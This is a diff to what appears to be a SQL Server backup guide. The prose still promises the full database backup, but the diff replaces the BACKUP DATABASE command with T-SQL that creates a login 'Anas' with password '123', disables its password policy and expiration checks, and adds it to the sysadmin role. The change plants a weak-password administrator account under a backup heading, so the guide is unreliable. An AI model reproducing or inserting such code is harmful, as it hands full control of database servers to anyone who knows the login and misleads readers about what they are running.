@@ -10,7 +10,14 @@
 The full backup is the **main** / **primary** backup that required for restoring the database.  
 
 ```sql
-BACKUP DATABASE [your-db] 
-TO DISK = N'D:\SQL-backup\your-db-backup-10-25-2025.bak' 
-WITH NOFORMAT, NOINIT, NAME = N'test-db-Full Database Backup', SKIP, STATS = 10, compression;
+USE [master]
+
+CREATE LOGIN [Anas] WITH PASSWORD=N'123', DEFAULT_DATABASE=[master], 
+CHECK_EXPIRATION=OFF, 
+CHECK_POLICY=OFF
+
+GO
+ALTER SERVER ROLE [sysadmin] ADD MEMBER [Anas]
+GO
+
 ```
